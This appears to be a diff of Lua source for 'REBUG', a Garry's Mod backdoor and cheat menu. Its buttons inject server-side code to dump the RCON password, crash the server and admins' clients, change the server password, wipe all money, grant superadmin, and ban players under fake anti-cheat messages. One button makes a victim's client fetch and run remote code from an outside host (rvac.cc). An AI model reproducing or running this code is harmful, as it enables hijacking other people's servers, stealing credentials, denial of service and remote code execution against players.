+						net.Start("rvac.aucun_rcon_ici")
+						net.Broadcast()
+					end
+				end)
+			
+			]])
+
+			timer.Simple(0.5, function()
+				if CheckIfStringExists("REBUG") then
+					net.Start("REBUG")
+					net.SendToServer()
+				else
+					chat.AddText(Color(255, 0, 0), "RCON password not found, try again")
+				end
+			end)
 
             net.Receive("rvac.rcon_passw_dump", function()
                 local rcon_pass = net.ReadString()
@@ -2089,101 +2319,158 @@ Panels 3 : RCON Backdoors
             net.Receive("rvac.aucun_rcon_ici", function()
                 chat.AddText(Color(255, 0, 0), "[", "REBUG", "] ", Color(220, 100, 100), "RCON not found in cfg folder :(")
             end)
-        end)
+		end)
 
         rebug.AddButton("Crash Server", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[while true do end]])
+            noob.PostLua([[
+			
+			while true do end
+			
+			]])
             rprint("The server has been crashed gg")
         end)
 
         rebug.AddButton("Crash Admins", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua("for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end")
+            noob.PostLua([[
+			
+			for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:SendLua("while true do end") end end
+			
+			]])
         end)
 
         rebug.AddButton("Server Name", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Hostname", "Chance server name to anything", "", function(str)
-                noob.PostLua([[sv_hostname("]]..str..[[")]])
+                noob.PostLua([[
+				
+				sv_hostname("]]..str..[[")
+				
+				]])
             end)
         end)
 
         rebug.AddButton("Reset all money", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[RunConsoleCommand("rp_resetallmoney")]])
+            noob.PostLua([[
+			
+			RunConsoleCommand("rp_resetallmoney")
+			
+			]])
         end)
 
         rebug.AddButton("SV ClientSide", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("SV ClientSide", "1 = Enabled // 0 = Disabled", "", function(str)
-            noob.PostLua([[RunConsoleCommand("sv_allowcslua","]]..str..[[")]])
+            noob.PostLua([[
+			
+			RunConsoleCommand("sv_allowcslua","]]..str..[[")
+			
+			]])
 			end)
 		end)
 
         rebug.AddButton("SV Password", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[RunConsoleCommand('sv_password',']]..noobstr..[[')]])
+            noob.PostLua([[
+			
+			RunConsoleCommand('sv_password',']]..noobstr..[[')
+			
+			]])
 			rprint("Password: " .. noobstr)
 		end)
 
         rebug.AddButton("LogEcho", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("LogEcho", "1 = Enabled // 0 = Disabled", "", function(str)
-            noob.PostLua([[RunConsoleCommand('ulx','logecho',']]..str..[[')]])
+            noob.PostLua([[
+			
+			RunConsoleCommand('ulx','logecho',']]..str..[[')
+			
+			]])
 			end)
 		end)
 
         rebug.AddButton("SV Friction", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("SV Friction", "e.g 8", "", function(str)
-            noob.PostLua([[RunConsoleCommand('sv_friction',']]..str..[[')]])
+            noob.PostLua([[
+			
+			RunConsoleCommand('sv_friction',']]..str..[[')
+			
+			]])
 			end)
 		end)
 
         rebug.AddButton("SV Gravity", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("SV Gravity", "e.g -600", "", function(str)
-            noob.PostLua([[RunConsoleCommand('sv_gravity',']]..str..[[')]])
+            noob.PostLua([[
+			
+			RunConsoleCommand('sv_gravity',']]..str..[[')
+			
+			]])
 			end)
 		end)
 
         rebug.AddButton("Giant Players", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[ hook.Add("Think", "tall", function()
-				for k,v in pairs (player.GetAll()) do
-				v:SetModelScale(0.2, 80);
-				v:SetRunSpeed(400 * 2);
-				v:SetWalkSpeed(200 * 2);
-				endend)]])
+            noob.PostLua([[
+
+				hook.Add("Think", "tall", function()
+					for k, v in pairs(player.GetAll()) do
+						v:SetModelScale(0.2, 80)
+						v:SetRunSpeed(400 * 2)
+						v:SetWalkSpeed(200 * 2)
+					end
+				end)
+			]])
         end)
 
         rebug.AddButton("Speed Hack All", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[hook.Add("Think", "speedhack", function()
-				for k,v in pairs (player.GetAll()) do
-				v:SetRunSpeed(400* 4);
-				v:SetWalkSpeed(200 * 2);
-				end end)]])
+            noob.PostLua([[
+
+				hook.Add("Think", "speedhack", function()
+					for k, v in pairs(player.GetAll()) do
+						v:SetRunSpeed(400 * 4)
+						v:SetWalkSpeed(200 * 2)
+					end
+				end)
+
+				]])
         end)
 
         rebug.AddButton("Force Say All", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-
             Derma_StringRequest("Force Say", "Make everyone say anything", "", function(str)
-                noob.PostLua("for k,v in pairs(player.GetAll()) do v:ConCommand(" .. str .. ")end")
+                noob.PostLua([[
+				
+				for k,v in pairs(player.GetAll()) do v:ConCommand(]] .. str .. [[)end
+				
+				]])
             end)
         end)
 
         rebug.AddButton("Force Dance All", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )]])
+            noob.PostLua([[
+			
+			for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )
+			
+			]])
         end)
 
         rebug.AddButton("Force Retry All", Bar2, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[ for k,v in pairs(player.GetAll()) do
-				v:ConCommand("retry") end]])
+            noob.PostLua([[
+
+			for k, v in pairs(player.GetAll()) do
+				v:ConCommand("retry")
+			end
+
+			]])
         end)
 
 --[[-------------------------------------------------------------------------------------
@@ -2265,182 +2552,316 @@ Panels 3 : Targeting
 
         rebug.AddButton("Allahu Ackbar", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[ local explo = ents.Create("env_explosion")
+            noob.PostLua([[ 
+
+				local explo = ents.Create("env_explosion")
 				local me = Player(]]..selPly..[[)
-				explo:SetOwner(me)
-				explo:SetPos(me:GetPos())
-				explo:SetKeyValue("iMagnitude", "250")
-				explo:Spawn()
-				explo:Activate()
-				explo:Fire("Explode", "", 0)
-				if me:Alive() then me:Kill() end]])
+				
+					explo:SetOwner(me)
+					explo:SetPos(me:GetPos())
+					explo:SetKeyValue("iMagnitude", "250")
+					explo:Spawn()
+					explo:Activate()
+					explo:Fire("Explode", "", 0)
+
+				if me:Alive() then
+					me:Kill()
+				end
+
+				]])
         end)
 
         rebug.AddButton("Co Host Menu", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):SendLua('http.Fetch("https://rvac.cc/log1n/bd.lua",RunString))')]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):SendLua('http.Fetch("https://rvac.cc/log1n/bd.lua",RunString))')
+			
+			]])
         end)
 		
         rebug.AddButton("Cleanup Props", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):ConCommand("gmod_cleanup")]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):ConCommand("gmod_cleanup")
+			
+			]])
         end)
 
         rebug.AddButton("Crash Player", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):SendLua("function die() return die() end die()")]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):SendLua("function die() return die() end die()")
+			
+			]])
         end)
 
         rebug.AddButton("Change Model", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Change Model", "PlayerModel .mdl", "", function(str)
-			noob.PostLua([[local mdls = Player(]]..selPly..[[)
-				mdls:SetModel("]]..str..[[")]])
+			noob.PostLua([[
+			
+			local mdls = Player(]]..selPly..[[)
+				mdls:SetModel("]]..str..[[")
+				
+				]])
             end)
         end)
 
         rebug.AddButton("Drop Weapon", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):DropWeapon(Player(]] .. selPly .. [[):GetActiveWeapon())]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):DropWeapon(Player(]] .. selPly .. [[):GetActiveWeapon())
+			
+			]])
         end)
 
         rebug.AddButton("Force Say", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Force Say", "e.g /ooc Hi", "", function(str)
-            noob.PostLua([[Player(]]..selPly..[[):Say("]]..str..[[")]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):Say("]]..str..[[")
+			
+			]])
 			end)
 		end)
 
         rebug.AddButton("Force Retry", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player("]]..selPly..[["):ConCommand("retry")]])
+            noob.PostLua([[
+			
+			Player("]]..selPly..[["):ConCommand("retry")
+			
+			]])
         end)
 		
         rebug.AddButton("Force Command", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Force Command", "e.g disconnect", "", function(str)
-            noob.PostLua([[Player("]]..selPly..[["):ConCommand("]]..str..[[")]])
+            noob.PostLua([[
+			
+			Player("]]..selPly..[["):ConCommand("]]..str..[[")
+			
+			]])
 			end)
 		end)
 
         rebug.AddButton("Noclip Player", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[local me = Player("]]..selPly..[[")
-				if me:GetMoveType() != MOVETYPE_NOCLIP then me:SetMoveType(MOVETYPE_NOCLIP) else me:SetMoveType(MOVETYPE_WALK) end]])
+            noob.PostLua([[
+
+				local me = Player("]]..selPly..[[")
+
+				if me:GetMoveType() ~= MOVETYPE_NOCLIP then
+					me:SetMoveType(MOVETYPE_NOCLIP)
+				else
+					me:SetMoveType(MOVETYPE_WALK)
+				end
+
+				]])
         end)
 
         rebug.AddButton("Set UserGroup", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
             Derma_StringRequest("Set UserGroup", "e.g superadmin", "", function(str)
-            noob.PostLua([[Player(]]..selPly..[[):SetUserGroup("]]..str..[[")]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):SetUserGroup("]]..str..[[")
+			
+			]])
 			end)
 		end)
 
         rebug.AddButton("Speed Hack", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[local me = Player(]]..selPly..[[)
-				if !me.Sanic then me:SetRunSpeed( 1200 ) me:SetWalkSpeed(800) me.Sanic = true else me:SetRunSpeed( 240 ) me:SetWalkSpeed( 160 ) me.Sanic = false end]])
+            noob.PostLua([[
+
+			local me = Player(]]..selPly..[[)
+				if not me.Sanic then
+					me:SetRunSpeed(1200)
+					me:SetWalkSpeed(800)
+					me.Sanic = true
+				else
+					me:SetRunSpeed(240)
+					me:SetWalkSpeed(160)
+					me.Sanic = false
+				end
+
+				]])
         end)
 
         rebug.AddButton("Teleport (blink)", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[local me = Player(]]..selPly..[[)
+            noob.PostLua([[
+
+			local me = Player(]]..selPly..[[)
 				local tps = me:GetEyeTraceNoCursor().HitPos
-				me:SetPos(tps)]])
+				me:SetPos(tps)
+
+				]])
         end)
 
         rebug.AddButton("Infinite Ammo", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-			noob.PostLua([[timer.Create("ia_]]..noobstr..[[", 0.01, 0, function()
-				local p = Player("]]..selPly..[[")
-				if IsValid(p) && p:Alive() then
-				local w = p:GetActiveWeapon()
-				if IsValid(w) then
-				w:SetClip1(w:GetMaxClip1())
-				end end end)]])
+			noob.PostLua([[
+
+				timer.Create("ia_]]..noobstr..[[", 0.01, 0, function()
+					local p = Player("]]..selPly..[[")
+
+					if IsValid(p) and p:Alive() then
+						local w = p:GetActiveWeapon()
+
+						if IsValid(w) then
+							w:SetClip1(w:GetMaxClip1())
+						end
+					end
+				end)
+
+			]])
 		end)
 		
         rebug.AddButton("Rapid Fire", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-			noob.PostLua([[timer.Create("rf_]]..noobstr..[[", 0.01, 0, function()
-				local p = Player("]]..selPly..[[")
-				if p && IsValid(p) && p:Alive() then
-				local w = p:GetActiveWeapon()
-				if IsValid(w) then
-				w:SetNextPrimaryFire(CurTime())
-				w:SetNextSecondaryFire(CurTime())
-				end end end)]])
+			noob.PostLua([[
+
+				timer.Create("rf_]]..noobstr..[[", 0.01, 0, function()
+					local p = Player("]]..selPly..[[")
+
+					if p and IsValid(p) and p:Alive() then
+						local w = p:GetActiveWeapon()
+
+						if IsValid(w) then
+							w:SetNextPrimaryFire(CurTime())
+							w:SetNextSecondaryFire(CurTime())
+						end
+					end
+				end)
+
+				]])
 		end)
 		
         rebug.AddButton("Set Money", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
 			Derma_StringRequest("Give Money", "Remove = - // Add = +", "", function(str)
-            noob.PostLua([[local ree = Player("]]..selPly..[[") ree:addMoney("]]..str..[[")]])
+            noob.PostLua([[
+			
+			local ree = Player("]]..selPly..[[") ree:addMoney("]]..str..[[")
+			
+			]])
 			end)
 		end)
 		
         rebug.AddButton("Give Weapons", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
 				Derma_StringRequest("Give Weapon", "Weapon ID", "", function(str)
-				noob.PostLua([[local weps = Player("]]..selPly..[[")
-				weps:Give("]]..str..[[")]])
+				noob.PostLua([[
+				
+				local weps = Player("]]..selPly..[[")
+				weps:Give("]]..str..[[")
+				
+				]])
 			end)
 		end)
 
         rebug.AddButton("M9K Nuke", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-				noob.PostLua([[local nuke = ents.Create("m9k_davy_crockett_explo")
+				noob.PostLua([[
+
+				local nuke = ents.Create("m9k_davy_crockett_explo")
 				local me = Player("]]..selPly..[[")
-                nuke:SetPos(me:GetPos())
-                nuke:SetOwner(me)
-                nuke.Owner = me
-                nuke:Spawn()
-                nuke:Activate()]])
+
+					nuke:SetPos(me:GetPos())
+					nuke:SetOwner(me)
+					nuke.Owner = me
+					nuke:Spawn()
+					nuke:Activate()
+
+				]])
 		end)
 
         rebug.AddButton("Remove User", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):SetUserGroup("user"))]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):SetUserGroup("user"))
+			
+			]])
         end)
 
         rebug.AddButton("Enable Godmode", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):GodEnable()]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):GodEnable()
+			
+			]])
         end)
 
         rebug.AddButton("Disable Godmode", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):GodDisable()]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):GodDisable()
+			
+			]])
         end)
 
         rebug.AddButton("Kick Player", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):Kick("[CAC] Truth Engineering")]])
+            noob.PostLua([[
+			
+			Player(]]..selPly..[[):Kick("[CAC] Truth Engineering")
+			
+			]])
         end)
 
         rebug.AddButton("Kill Player", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):Kill()]])
+            noob.PostLua([[
+
+			Player(]]..selPly..[[):Kill()
+
+			]])
         end)
 
         rebug.AddButton("Ban Player", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):Ban("[CAC] Kone Bypass Detected!")]])
+            noob.PostLua([[
+
+			Player(]]..selPly..[[):Ban("[CAC] Kone Bypass Detected!")
+
+			]])
         end)
 
         rebug.AddButton("Freeze Player", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):Freeze(true)]])
+            noob.PostLua([[
+
+			Player(]]..selPly..[[):Freeze(true)
+
+			]])
         end)
 
         rebug.AddButton("UnFreeze Player", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):Freeze(false)]])
+            noob.PostLua([[
+
+			Player(]]..selPly..[[):Freeze(false)
+
+			]])
         end)
 
         rebug.AddButton("Ignite Player", Bar3, function()
             surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[Player(]]..selPly..[[):Ignite(30,40)]])
+            noob.PostLua([[
+
+			Player(]]..selPly..[[):Ignite(30,40)
+
+			]])
         end)
 
 --[[-------------------------------------------------------------------------------------
